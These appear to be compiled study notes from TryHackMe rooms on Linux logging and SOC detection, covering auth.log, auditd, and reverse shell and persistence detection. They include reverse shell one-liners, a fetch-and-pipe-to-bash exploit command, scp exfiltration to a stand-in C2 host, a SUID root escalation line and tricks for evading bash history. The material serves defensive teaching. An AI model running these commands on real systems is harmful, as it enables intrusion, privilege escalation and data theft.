## Authentication Logs

The first and often the most useful log file you want to monitor is `/var/log/auth.log` (or `/var/log/secure` on RHEL-based systems).

In addition to the system logs, the SSH daemon stores its own log of successful and failed SSH logins. These logs are sent to the same auth.log file, but have a slightly different format. Let's see the example of two failed and one successful SSH logins:

SSH-Specific Events

```bash
root@thm-vm:~$ cat /var/log/auth.log | grep "sshd" | grep -E 'Accepted|Failed'
```

Their content and format can differ depending on the OS, and the most common log files are:

- `/var/log/kern.log`: Kernel messages and errors, useful for more advanced investigations
- `/var/log/syslog (or /var/log/messages)`: A consolidated stream of various Linux events
- `/var/log/dpkg.log (or /var/log/apt)`: Package manager logs on Debian-based systems
- `/var/log/dnf.log (or /var/log/yum.log)`: Package manager logs on RHEL-based systems
Although the Bash history file looks like a vital log source, it is rarely used by SOC teams in their daily routine. This is because it does not track non-interactive commands (like those initiated by your OS, cron jobs, or web servers) and has some other limitations. While you can [configure it](https://datawookie.dev/blog/2023/04/configuring-bash-history/) to be more useful, there are still a few issues you should know about:

Bash History Limitations

```bash
# Attackers can simply add a leading space to the command to avoid being logged
ubuntu@thm-vm:~$  echo "You will never see me in logs!"

# Attackers can paste their commands in a script to hide them from Bash history
ubuntu@thm-vm:~$ nano legit.sh && ./legit.sh
 
# Attackers can use other shells like /bin/sh that don't save the history like Bash
ubuntu@thm-vm:~$ sh
$ echo "I am no longer tracked by Bash!"
```

## Runtime Monitoring

Up to this point, you have explored various Linux log sources, but none can reliably answer questions like "Which programs did Bob launch today?" or "Who deleted my home folder, and when?". That's because, by default, Linux doesn't log process creation, file changes, or network-related events, collectively known as **runtime** events. Interestingly, Windows faces the same limitation, which is why in the [Windows Logging for SOC](https://tryhackme.com/room/windowsloggingforsoc) room we had to use an additional tool: Sysmon.

system calls. In short, whenever you need to open a file, create a process, access the camera, or request any other OS service, you make a specific system call. There are [over 300](https://man7.org/linux/man-pages/man2/syscalls.2.html) system calls in Linux, like `execve` to execute a program. Below is a high-level flowchart of how it works:

![A flowchart of a Linux system call: you start a program, the "execve" system call is passed to the kernel, the kernel uses hardware resources, and returns the results.](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1757002115631.svg)

Why do you need to know about system calls? Well, all modern EDRs and logging tools rely on them - they monitor the main system calls and log the details in a human-readable format. Since there is nearly no way for attackers to bypass system calls, all you have to do is choose the system calls you'd like to log and monitor.
## Audit Daemon

Auditd (Audit Daemon) is a built-in auditing solution often used by the SOC team for runtime monitoring.

ere, auditd splits the event into four lines: the PROCTITLE shows the process command line, CWD reports the current working directory, and the remaining two lines show the system call details, like:

- `pid=3888, ppid=3752`: Process ID and Parent Process ID. Helpful in linking events and building a process tree
- `auid=ubuntu`: Audit user. The account originally used to log in, whether locally (keyboard) or remotely (SSH)
- `uid=root`: The user who ran the command. The field can differ from auid if you switched users with sudo or su
- `tty=pts1`: Session identifier. Helps distinguish events when multiple people work on the same Linux server
- `exe=/usr/bin/wget`: Absolute path to the executed binary, often used to build SOC detection rules
- `key=proc_wget`: Optional tag specified by engineers in auditd rules that is useful to filter the events
## Auditd Alternatives

You might have noticed an inconvenient output of auditd - although it provides a verbose logging, it is hard to read and ingest into SIEM. That's why many SOC teams resort to the alternative runtime logging solutions, for example:

- [Sysmon for Linux](https://github.com/microsoft/SysmonForLinux): A perfect choice if you already work with Sysmon and love XML
- [Falco](https://falco.org/): A modern, open-source solution, ideal for monitoring containerized systems
- [Osquery](https://osquery.io/): An interesting tool that can be broadly used for various security purposes
- [EDRs](https://tryhackme.com/room/introductiontoedr): Most EDR solutions can track and monitor various Linux runtime events
The key to remember is that all listed tools work on the same principle - monitoring system calls.

Below are three of the many methods to open a reverse shell on Linux:

|Command on the Victim|Explanation|
|---|---|
|`bash -i >& /dev/tcp/10.10.10.10/1337 0>&1`|The victim is forced to connect to 10.10.10.10:1337 and launch "bash" for the attacker.|
|`socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane`|Socat alternative to the above command. The attacker is listening at 10.20.20.20:2525.|
|`python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'`|Python alternative to the above command. The attacker is listening at 10.30.30.30:80.|

## Detecting Reverse Shells

SOC typically treats reverse shells as critical alerts as they indicate that the system has already been breached and a human threat actor is actively attempting to establish a shell and continue the attack. Luckily, they are detectable with auditd. Below is the log output when a socat reverse shell is established after exploiting a vulnerability in the TryPingMe application:

Finding Reverse Shell Origin

```shell-session
root@thm-vm:~$ ausearch -i -x socat # Look for suspicious commands like socat
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --pid 27806 # Find its parent process and build a process tree
type=PROCTITLE msg=audit(09/19/25 17:42:07.825:404) : proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:07.825:404) : ppid=27796 pid=27806 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --pid 27796 # Move up the process tree to confirm its origin - TryPingMe
type=PROCTITLE msg=audit(09/19/25 17:41:57.252:403) : proctitle=/usr/bin/python3 /opt/trypingme/main.py
type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid=1 pid=27796 auid=unset uid=serviceuser key=exec
```
the attackers need [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/), which can be achieved through various techniques. For example, to get to the root user, the threat actors may:

| Preceding Discovery (IF)                                              | Privilege Escalation (THEN)                                                   |
| --------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| The `uname -a` shows an old, unpatched Ubuntu 16.04                   | Run an exploit like PwnKit: `wget http://bad.thm/pwnkit.sh \| bash`           |
| The `find /bin -perm 4000` detects an `env` binary with the SUID flag | Use the SUID vulnerability to get root access: `/bin/env /bin/bash -p`        |
| The `ls /etc/ssh` exposed an unprotected `ssh-backup-key` file        | Try using the file to get root access: `ssh root@127.0.0.1 -i ssh-backup-key` |
```bash
# Detection 1: A Spike of Discovery Commands
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel

# Detection 2: A Download to Temp Directory
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit

# Detection 3: Data Exfiltration With SCP
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
```

## Persistence in Linux

Standalone Linux servers can run for years without a single reboot and are often left untouched unless something breaks. Some threat actors rely on it and do not rush to establish [Persistence](https://attack.mitre.org/tactics/TA0003/). However, those aiming for long-term access often set up one or two additional backdoors. As in Windows, there are many ways threat actors persist on Linux. Let's start with the most common ones.

## Cron Persistence
**Rocke** cryptominer. After exploiting vulnerabilities in public-facing services like Redis or phpMyAdmin, Rocke downloads the cryptomining script from Pastebin and installs it as a `/etc/cron.d/root` cron job ([Red Canary blogpost](https://redcanary.com/blog/threat-detection/rocke-cryptominer/#:~:text=Rocke%20takes%20advantage%20of%20this%20to%20modify%20crontabs)). Note the `*/10` part, which means the script will be redownloaded every 10 minutes, likely to quickly restore its files in case the IT team accidentally deletes them.
## Systemd Persistence

Systemd services host the most critical system components. Nowadays, DNS, SSH, and nearly every web service are organized as separate .service files located at `/lib/systemd/system` or `/etc/systemd/system` folders.

## Detecting Persistence
 Persistence can be detected by tracking the creation of related processes, specifically `crontab` for managing cron jobs and `systemctl` for managing services:

|                                    |                                                                                                                                                          |
| ---------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Monitor changes in cron job files  | `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*`                                                                              |
| Monitor changes in systemd folders | `/lib/systemd/system/*`, `/etc/systemd/system/*`, and [less common](https://manpages.ubuntu.com/manpages/questing/en/man5/systemd.unit.5.html) locations |
| Monitor related processes such as  | `nano /etc/crontab`, `crontab -e`, `systemctl start\|enable <service>`                                                                                   |

DetectingPersistenceWith Auditd

```shell-session
root@thm-vm:~$ ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd
type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=vi /etc/systemd/system/malicious.service
type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/etc/systemd/system/malicious.service
type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/
type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd

root@thm-vm:~$ ausearch -i -x crontab # Look for execution of crontab command
type=PROCTITLE msg=audit(09/22/25 17:25:14.933:807) : proctitle=crontab -e
type=SYSCALL msg=audit(09/22/25 17:25:14.933:807) : syscall=execve [...] ppid=1265 pid=1316 uid=root key=exec
```
## Account Persistence

## New User Account

If SSH is exposed, the attackers may create a new user account, add it to a privileged group, and then use it for further SSH logins. The detection is simple, too, as you can track the user creation events through authentication logs and then reconstruct the full process tree with auditd (by starting with `ausearch -i --ppid 27254`

Traces of a backdoor created with "echo [key] >> ~/.ssh/authorized_keys"  
Note how the malicious "echo" command is logged simply as "bash" 
root@thm-vm:~$ ausearch -i -f /.ssh/authorized_keys

**Linux as Entry Point**

Linux machines are commonly deployed as firewalls, web servers, mail servers, or other public-facing services. Even in organizations where 99% of the infrastructure is Windows-based, a single compromised Linux server can open the door to a corporate network and result in a big [Impact](https://attack.mitre.org/tactics/TA0040/).

**Linux in Espionage**

Linux machines can store sensitive information or be used in mission-critical networks and thus are often targeted by state-sponsored threat groups. For example, in this espionage campaign ([Symantec article](https://www.security.com/threat-intelligence/springtail-kimsuky-backdoor-espionage)), Kimsuky APT installed a backdoor on multiple important Linux targets. Interestingly, they used systemd service persistence - the technique you already know.

![Kimsuky APT breaches the critical Linux server and establishes Persistence there via a systemd service cleverly named "syslogd".](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1758756245665.svg)**Linux in Ransomware**

Linux ransomware is [on the rise](https://invenioit.com/security/linux-ransomware-attacks-rise/?srsltid=AfmBOoqCQp_0W_lZxIKX9OoiEmXNjK9ZEXx6S91fwY5bVre1o099D3wp#:~:text=EDR%20in%20Action%20%E2%86%92-,Does%20Ransomware%20Affect%20Linux%3F,-Yes%2C%20ransomware%20can), with hypervisors becoming a prime target. Imagine the case: Your company runs hundreds of Windows VMs, all sitting on just three Linux physical servers (hypervisors). If those hypervisors aren't properly secured, all corporate VMs are at risk. For a real-world example of how attackers breach hypervisors, check out the [Varonis article](https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire#ransomware-payload).

![First, the attacker breaches the Linux hypervisor and, from there, manages to encrypt all hosted virtual machines.](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1758758482985.svg)